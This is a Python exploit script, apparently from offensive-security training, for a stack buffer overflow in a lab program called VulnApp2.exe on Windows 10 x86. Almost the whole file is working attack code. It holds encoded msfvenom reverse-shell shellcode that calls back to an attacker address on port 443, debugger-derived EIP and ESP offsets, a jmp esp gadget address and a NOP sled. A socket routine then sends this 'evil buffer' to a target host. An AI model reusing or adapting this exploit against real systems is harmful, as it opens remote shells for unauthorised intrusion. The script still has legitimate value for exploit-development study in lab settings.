#!/usr/bin/python

# 3.4.9.2 Extra Mile - VulnApp2.exe [6ca1ff4c257aa667e9569063f70482d0]
# Date: 20250202
# Exploit Author: Artur [ajes] Szymczak
# Tested on: Windows 10 EN x86 - build: 10.0.16299

import socket
import struct

# target
host = "192.168.1.211"
port = 7002

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x3b\x45"
shellcode =  b""
shellcode += b"\xdd\xc1\xd9\x74\x24\xf4\x5e\x2b\xc9\xbd\x88"
shellcode += b"\xac\xb3\xc5\xb1\x52\x31\x6e\x17\x03\x6e\x17"
shellcode += b"\x83\x4e\xa8\x51\x30\xb2\x59\x17\xbb\x4a\x9a"
shellcode += b"\x78\x35\xaf\xab\xb8\x21\xa4\x9c\x08\x21\xe8"
shellcode += b"\x10\xe2\x67\x18\xa2\x86\xaf\x2f\x03\x2c\x96"
shellcode += b"\x1e\x94\x1d\xea\x01\x16\x5c\x3f\xe1\x27\xaf"
shellcode += b"\x32\xe0\x60\xd2\xbf\xb0\x39\x98\x12\x24\x4d"
shellcode += b"\xd4\xae\xcf\x1d\xf8\xb6\x2c\xd5\xfb\x97\xe3"
shellcode += b"\x6d\xa2\x37\x02\xa1\xde\x71\x1c\xa6\xdb\xc8"
shellcode += b"\x97\x1c\x97\xca\x71\x6d\x58\x60\xbc\x41\xab"
shellcode += b"\x78\xf9\x66\x54\x0f\xf3\x94\xe9\x08\xc0\xe7"
shellcode += b"\x35\x9c\xd2\x40\xbd\x06\x3e\x70\x12\xd0\xb5"
shellcode += b"\x7e\xdf\x96\x91\x62\xde\x7b\xaa\x9f\x6b\x7a"
shellcode += b"\x7c\x16\x2f\x59\x58\x72\xeb\xc0\xf9\xde\x5a"
shellcode += b"\xfc\x19\x81\x03\x58\x52\x2c\x57\xd1\x39\x39"
shellcode += b"\x94\xd8\xc1\xb9\xb2\x6b\xb2\x8b\x1d\xc0\x5c"
shellcode += b"\xa0\xd6\xce\x9b\xc7\xcc\xb7\x33\x36\xef\xc7"
shellcode += b"\x1a\xfd\xbb\x97\x34\xd4\xc3\x73\xc4\xd9\x11"
shellcode += b"\xd3\x94\x75\xca\x94\x44\x36\xba\x7c\x8e\xb9"
shellcode += b"\xe5\x9d\xb1\x13\x8e\x34\x48\xf4\x71\x60\x53"
shellcode += b"\x14\x1a\x73\x53\x15\x61\xfa\xb5\x7f\x85\xab"
shellcode += b"\x6e\xe8\x3c\xf6\xe4\x89\xc1\x2c\x81\x8a\x4a"
shellcode += b"\xc3\x76\x44\xbb\xae\x64\x31\x4b\xe5\xd6\x94"
shellcode += b"\x54\xd3\x7e\x7a\xc6\xb8\x7e\xf5\xfb\x16\x29"
shellcode += b"\x52\xcd\x6e\xbf\x4e\x74\xd9\xdd\x92\xe0\x22"
shellcode += b"\x65\x49\xd1\xad\x64\x1c\x6d\x8a\x76\xd8\x6e"
shellcode += b"\x96\x22\xb4\x38\x40\x9c\x72\x93\x22\x76\x2d"
shellcode += b"\x48\xed\x1e\xa8\xa2\x2e\x58\xb5\xee\xd8\x84"
shellcode += b"\x04\x47\x9d\xbb\xa9\x0f\x29\xc4\xd7\xaf\xd6"
shellcode += b"\x1f\x5c\xcf\x34\xb5\xa9\x78\xe1\x5c\x10\xe5"
shellcode += b"\x12\x8b\x57\x10\x91\x39\x28\xe7\x89\x48\x2d"
shellcode += b"\xa3\x0d\xa1\x5f\xbc\xfb\xc5\xcc\xbd\x29"

# info from debugging:
## offsets:
### [ecx]: 0
### eip: 2080
### [esp]: 2084
### ebp: 2076

## gadgets:
### 0:005> s 14800000 14816000 0xff 0xe4
### 1480113d  ff e4 83 7d ec 00 75 03-58 5b c3 5b 8b e5 5d c3  ...}..u.X[.[..].
### 0:005> u 1480113d  
### VulnApp2+0x113d:
### 1480113d ffe4            jmp     esp


# payload (2096):
nops        = b"\x90" * (2080-len(shellcode))
eip         = struct.pack("<I", 0x1480113d)
jmp         = b"\x81\xC4\x20\xFE\xFF\xFF" + b"\xFF\xE4" # ADD ESP,-480; JMP ESP
offset      = b"D" * (2096 - len(nops+shellcode+eip+jmp))
payload     = nops + shellcode + eip + jmp + offset

###
# buffer:
buffer = payload

try:
    print("\nSending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()

    print("\nDone!")

except socket.error:
    print("\nCould not connect!")

